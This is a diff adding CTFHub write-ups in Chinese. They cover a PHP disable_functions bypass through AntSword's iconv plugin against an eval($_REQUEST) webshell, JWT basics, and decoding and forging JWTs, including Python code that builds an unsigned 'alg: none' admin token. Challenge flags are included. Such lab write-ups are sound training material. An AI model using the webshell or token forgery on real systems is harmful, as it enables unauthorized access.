+用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`iconv`**，点击开始即可。
+
+用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。
+
+编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-2ff1cf898aac35ab-bb568d689-kc5th 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{573f58bf1eb135afb2dccdb6}
+```
+
+提交`ctfhub{573f58bf1eb135afb2dccdb6}`即可。
+
+------
+
+### bypass iconv 2
+
+这是一个利用PHP iconv扩展进行disable_functions绕过的进阶攻击环境，通过eval($_REQUEST['ant'])执行恶意代码。攻击者利用iconv_open()函数在处理字符集名称时的风险，通过精心构造超长或特殊的字符集参数触发缓冲区溢出或内存破坏，结合PHP垃圾回收机制实现Use-After-Free利用，在特定PHP版本中绕过安全限制执行系统命令，最终实现权限提升和Webshell持久化控制，体现了字符编码处理模块在边界检查方面的安全隐患。
+
+靶机的源码如下：
+
+```php+HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTFHub Bypass disable_function —— iconv Bypass 2</title>
+</head>
+<body>
+<h1>CTFHub Bypass disable_function —— iconv Bypass 2</h1>
+<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
+</body>
+</html>
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。
+
+在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。
+
+在插件中选择模式**`iconv`**，点击开始即可。
+
+用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。
+
+编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-207cb61c0d37a801-85cd66f77d-rl9kw 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+(www-data:/var/www/html) $ cat /readflag
+#!/bin/sh
+tac /flag
+(www-data:/var/www/html) $ /readflag
+ctfhub{af84d50e4e4b8f1514f84637}
+```
+
+提交`ctfhub{af84d50e4e4b8f1514f84637}`即可。
+
+------
+
+## JSON Web Token
+
+### 基础知识
+
+> 学习什么是 JWT
+
+题目附件是https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob，详细地讲解了JWT概念。
+
+简单来说，JWT是JSON Web Token的缩写， JWT由Header、Payload和Signature三部分组成，其中Header和Payload这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。题目附件的详细内容如下：
+
+> #### 什么是JWT
+>
+> Json Web Token (JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（[RFC 7519](https://tools.ietf.org/html/rfc7519)。
+>
+> 该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景，是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。
+>
+> #### JWT 的原理
+>
+> JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。
+>
+> ```json
+> {
+>   "姓名": "张三",
+>   "角色": "管理员",
+>   "到期时间": "2018年7月1日0点0分"
+> }
+> ```
+>
+> 以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。
+>
+> 服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。
+>
+> #### JWT 的数据结构
+>
+> 实际当中 JWT 长这个样子：
+>
+> ```
+> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ
+> ```
+>
+> 它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的
+>
+> JWT 的三个部分依次如下:
+>
+> - Header（头部）
+> - Payload（负载）
+> - Signature（签名）
+>
+> 写成一行，就是`Header.Payload.Signature`。
+>
+> 每个部分最后都会使用 `base64URLEncode` 方式进行编码：
+>
+> ```python
+> #!/usr/bin/env python
+> function base64url_encode($data) {
+>     return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
+> } 
+> ```
+>
+> #### Header
+>
+> Header 部分是一个 JSON 对象，描述 JWT 的元数据，以上述例子为例。
+>
+> `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` 使用 `base64decode` 之后是：
+>
+> ```json
+> {
+>   "alg": "HS256",
+>   "typ": "JWT"
+> }
+> ```
+>
+> header部分最常用的两个字段是alg和typ。
+>
+> alg属性表示token签名的算法(algorithm)，最常用的为HMAC和RSA算法
+>
+> typ属性表示这个token的类型（type），JWT 令牌统一写为JWT。
+>
+> #### Payload
+>
+> Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。
+>
+> - iss (issuer)：签发人
+> - exp (expiration time)：过期时间
+> - sub (subject)：主题
+> - aud (audience)：受众
+> - nbf (Not Before)：生效时间
+> - iat (Issued At)：签发时间
+> - jti (JWT ID)：编号
+>
+> 除了官方字段，还能在这个部分定义私有字段，以上述例子为例。Payload部分的base64编码内容`eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0`在`base64` 解码后是：
+>
+> ```
+> {
+>   "sub": "1234567890",
+>   "name": "CTFHub",
+>   "iat": 1516239022
+> }
+> ```
+>
+> 注意：JWT 默认是不会对 Payload 加密的，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分。
+>
+> #### Signature
+>
+> Signature 部分是对前两部分的签名，防止数据篡改
+>
+> 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，**使用 Header 里面指定的签名算法（默认是 HMAC SHA256）**，按照下面的公式产生签名。
+>
+> ```javascript
+> HMACSHA256(
+>   base64UrlEncode(header) + "." +
+>   base64UrlEncode(payload),
+>   secret)
+> ```
+>
+> 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用"点"（.）分隔，就可以返回给用户。
+>
+> #### FLAG
+>
+> ```
+> ctfhub{cfd61b8a7397fa7c10b2ae548f5bfaef}
+> ```
+
+提交`ctfhub{cfd61b8a7397fa7c10b2ae548f5bfaef}`即可。
+
+------
+
+### 敏感信息泄露
+
+> JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 `flag{}`。
+
+进入靶机后看到一个名为`Web Login`的登录框，包含账号、密码的输入框和登录按钮。
+
+打开Chrome的`Network`抓包，随便输入测试一下。输入账号`admin`和密码`123`，居然成功登录，回显：
+
+```
+welcome admin
+Where is Flag?
+```
+
+在`Response Headers`中可以看到`Set-Cookie`包含`token`信息如下：
+
+```
+token=eyJBRyI6Ijk0YzUxMTExMzZmZDMyY30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJGTCI6ImN0Zmh1YntkN2Q2YTdlNTAifQ.R1vt_3OMolyUUIHw-RWDxF-9R8Z_63kWxcCXrFKT_pw;
+```
+
+`token`正好是`Header.Payload.Signature`的`JWT`格式。
+
+编写`Python`代码求解`JWT`：
+
+```python
+import json
+import base64
+
+def jwt_decode(token):
+    parts = token.split('.')
+    if len(parts) != 3:
+        raise ValueError("Invalid JWT")
+    # 补全base64 padding并进行base64解码
+    def _b64decode(s):
+        s += '=' * (-len(s) % 4)
+        return base64.b64decode(s)
+    # 用loads加载json数据
+    header = json.loads(_b64decode(parts[0]))
+    payload = json.loads(_b64decode(parts[1]))
+    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
+    return header, payload, signature
+
+token = 'eyJBRyI6Ijk0YzUxMTExMzZmZDMyY30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJGTCI6ImN0Zmh1YntkN2Q2YTdlNTAifQ.R1vt_3OMolyUUIHw-RWDxF-9R8Z_63kWxcCXrFKT_pw'
+(h, p, s) = jwt_decode(token)
+print("Header:", h)
+# Header: {'AG': '94c5111136fd32c}', 'typ': 'JWT', 'alg': 'HS256'}
+print("Payload:", p)
+# Payload: {'username': 'admin', 'password': '123', 'FL': 'ctfhub{d7d6a7e50'}
+flag = p['FL']+h['AG']
+print(flag)
+# ctfhub{d7d6a7e5094c5111136fd32c}
+```
+
+如果是非断网离线环境，也可以直接用https://www.jwt.io/线上解密，非常直观清晰。
+
+提交`ctfhub{d7d6a7e5094c5111136fd32c}`即可。
+
+------
+
+### 无签名
+
+> 一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。
+
+进入靶机后看到一个名为`Web Login`的登录框，包含账号、密码的输入框和登录按钮。
+
+打开Chrome的`Network`抓包，随便输入测试一下。输入账号`admin`和密码`123`，看到以下回显信息：
+
+> Hello admin(guest), only admin can get flag.
+
+`(guest)`说明我们的登录角色其实并不是`admin`。
+
+抓包后在`Cookie`中看到`token`信息如下：
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Gj5LcMKKCyWHpGmZHhUAzchUQp_9Lwp7LkM2O5g1Cso
+```
+
+直接用https://www.jwt.io/线上解密，先用`JWT Decoder`拿到`Json`数据后再用`JWT Encoder`。
+
+题目描述中说了：当alg字段为空时，后端将不执行签名验证。
+
+修改`Header`数据中的`alg`为`none`。
+
+```json
+{
+  "typ": "JWT",
+  "alg": "none"
+}
+```
+
+修改`Payload`数据中的`role`为`admin`。
+
+```json
+{
+  "username": "admin",
+  "password": "123",
+  "role": "admin"
+}
+```
+
+`JWT Encoder`生成的新JSON Web Token如下：
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
+```
+
+当然，也可以编写`Python`代码求解：
+
+```python
+import json
+import base64
+
+def jwt_decode(token):
+    parts = token.split('.')
+    if len(parts) != 3:
+        raise ValueError("Invalid JWT")
+    # 补全base64 padding并进行base64解码
+    def _b64decode(s):
+        s += '=' * (-len(s) % 4)
+        return base64.b64decode(s)
+    # 用loads加载json数据
+    header = json.loads(_b64decode(parts[0]))
+    payload = json.loads(_b64decode(parts[1]))
+    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
+    return header, payload, signature
+
+token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Gj5LcMKKCyWHpGmZHhUAzchUQp_9Lwp7LkM2O5g1Cso'
+(h, p, s) = jwt_decode(token)
+print("Header:", h)
+# Header: {'typ': 'JWT', 'alg': 'HS256'}
+print("Payload:", p)
+# Payload: {'username': 'admin', 'password': '123', 'role': 'guest'}
+# JWT无签名攻击 修改Header和Payload
+h['alg'] = 'none'
+print("Modified Header:", h)
+# Modified Header: {'typ': 'JWT', 'alg': 'none'}
+p['role'] = 'admin'
+print("Modified Payload:", p)
+# Modified Payload: {'username': 'admin', 'password': '123', 'role': 'admin'}
+# 构造Base64URL
+def jwt_encode(data):
+    # 先转成 JSON 字符串（无空格）
+    json_str = json.dumps(data, separators=(',', ':'))
+    b64 = base64.b64encode(json_str.encode()).decode()
+    # 转为 Base64Url：替换字符 + 移除填充
+    return b64.replace('+', '-').replace('/', '_').rstrip('=')
+
+def jwt_encode_nosign(header:json, payload:json):
+    h = jwt_encode(header)
+    p = jwt_encode(payload)
+    nosign_jwt = f"{h}.{p}."
+    return nosign_jwt
+
+none_jwt = jwt_encode_nosign(h, p)
+print("None JWT:", none_jwt)
+# None JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
+```
+
+用`HackBar`构造`GET`请求，URL为靶机链接，点击`MODIFY HEADER`添加`Cookie`值。
+
+```
+token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
+```
+
+靶机的回显信息如下：
+
+> Hello admin(admin), only admin can get flag.
+> ctfhub{8dd8338632fdbd43ecb23d13}
+
+提交`ctfhub{8dd8338632fdbd43ecb23d13}`即可。
+
+------
+
 # MISC
 
 ## 数据库类流量
